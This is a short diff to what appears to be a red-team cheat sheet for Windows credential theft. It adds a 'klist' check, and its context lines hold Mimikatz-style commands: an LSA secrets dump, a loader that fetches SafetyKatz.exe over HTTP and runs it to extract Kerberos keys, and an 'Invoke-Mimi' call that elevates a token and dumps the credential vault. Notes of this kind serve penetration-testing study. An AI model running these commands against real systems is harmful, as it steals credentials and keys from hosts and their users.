@@ -30,7 +30,10 @@ lsadump::lsa /patch
 ```powershell
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
 ```
-
+to check
+```powershell
+klist
+```
 ### **Extract from credential vault**
 ```powershell
 Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
